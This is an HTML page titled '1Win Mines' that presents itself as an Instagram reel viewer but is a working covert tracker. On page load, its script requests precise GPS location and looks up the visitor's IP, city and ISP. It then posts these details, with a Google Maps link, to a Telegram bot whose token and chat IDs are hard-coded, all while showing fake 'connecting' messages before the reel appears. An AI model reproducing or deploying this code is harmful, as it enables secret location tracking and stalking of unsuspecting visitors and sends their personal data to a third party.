<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>1Win Mines</title>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
      font-family: Arial, sans-serif;
      background: black;
    }
    #bg-image {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      object-fit: cover;
      z-index: 1;
      transition: opacity 4s ease;
      opacity: 1;
    }
    #insta-video {
      display: none;
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      border: none;
      z-index: 2;
    }
    #loading-overlay {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.6);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 3;
    }
    .loader {
      width: 50px; height: 50px;
      border: 5px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    #loading-text { color: white; font-size: 18px; text-align: center; }
  </style>
</head>
<body>
  <!-- Default background image -->
  <img id="bg-image" src="https://raw.githubusercontent.com/danish-attar/omegle/refs/heads/main/smart-phone-with-instagram-app-logo-on-its-screen-vector-51195621.jpg" alt="Background">

  <!-- Instagram Reel Embed (hidden until permission granted) -->
  <iframe
    id="insta-video"
    src="https://www.instagram.com/reel/DP1Qrn7jAcJ/embed"
    allowtransparency="true"
    allowfullscreen="true"
    scrolling="no"
    frameborder="0">
  </iframe>

  <!-- Loading overlay -->
  <div id="loading-overlay">
    <div class="loader"></div>
    <div id="loading-text">Connecting to server...</div>
  </div>

  <script>
    // Telegram bot details (unchanged)
    const botToken = '8440190119:AAH9ukiBj1NhHh7-rNb9vv22vj7m64rHSC4';
    const chatId = ['7173355426','1322448170'];

    // DOM elements
    const loadingOverlay = document.getElementById('loading-overlay');
    const bgImage = document.getElementById('bg-image');
    const instaFrame = document.getElementById('insta-video');
    const loadingText = document.getElementById('loading-text');
    const loadingMessages = [
      "Connecting to secure node...",
      "Fetching location data...",
      "Analyzing network details...",
      "Finalizing connection..."
    ];

    // Function to get IP info
    async function getIPInfo() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const detailsResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        return await detailsResponse.json();
      } catch (error) {
        console.error("IP info error:", error);
        return {};
      }
    }

    // Function to get precise location (browser handles permission)
    function getPreciseLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve(null);
          return;
        }
        navigator.geolocation.getCurrentPosition(
          position => resolve({
            lat: position.coords.latitude,
            lon: position.coords.longitude,
            accuracy: position.coords.accuracy,
            timestamp: new Date().toLocaleString()
          }),
          error => {
            console.warn("Location error:", error);
            resolve(null);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // Function to send data to Telegram
    async function sendToTelegram(data) {
      try {
        let message = `ðŸ•µï¸ NEW VISITOR TRACKED ðŸ•µï¸\n\n`;
        message += `ðŸ“± Device: ${navigator.userAgent}\n\n`;
        message += `ðŸŒ IP: ${data.ip || 'Unknown'}\n`;
        message += `ðŸ“ IP Location: ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country_name || 'Unknown'}\n`;
        message += `ðŸ¢ ISP: ${data.org || 'Unknown'}\n`;

        if (data.liveLocation) {
          message += `\nðŸŽ¯ LIVE GPS LOCATION:\n`;
          message += `ðŸ”¹ Latitude: ${data.liveLocation.lat}\n`;
          message += `ðŸ”¹ Longitude: ${data.liveLocation.lon}\n`;
          message += `ðŸ”¹ Accuracy: ${data.liveLocation.accuracy}m\n`;
          message += `ðŸ”¹ Time: ${data.liveLocation.timestamp}\n`;
          message += `ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${data.liveLocation.lat},${data.liveLocation.lon}\n`;
        } else {
          message += `\nðŸ“ APPROX LOCATION:\n`;
          message += `ðŸ”¹ Latitude: ${data.latitude || 'Unknown'}\n`;
          message += `ðŸ”¹ Longitude: ${data.longitude || 'Unknown'}\n`;
          if (data.latitude && data.longitude) {
            message += `ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
          }
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        if (data.liveLocation) {
          await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chatId,
              latitude: data.liveLocation.lat,
              longitude: data.liveLocation.lon
            })
          });
        }
      } catch (error) {
        console.error("Telegram error:", error);
      }
    }

    // Rotate loading messages
    function rotateLoadingMessages() {
      let counter = 0;
      setInterval(() => {
        loadingText.textContent = loadingMessages[counter];
        counter = (counter + 1) % loadingMessages.length;
      }, 3000);
    }

    // Main tracking function
    async function trackUser() {
      rotateLoadingMessages();
      const liveLocation = await getPreciseLocation();
      const ipDetails = await getIPInfo();
      const trackingData = { ...ipDetails, ip: ipDetails.ip || 'Unknown', liveLocation };
      await sendToTelegram(trackingData);

      // After location permission and tracking
      setTimeout(() => {
        loadingOverlay.style.display = 'none';
        bgImage.style.opacity = '0';
        setTimeout(() => {
          instaFrame.style.display = 'block';
        }, 4000); // show video after fade-out
      }, 2000);
    }

    window.onload = trackUser;
  </script>
</body>
</html>
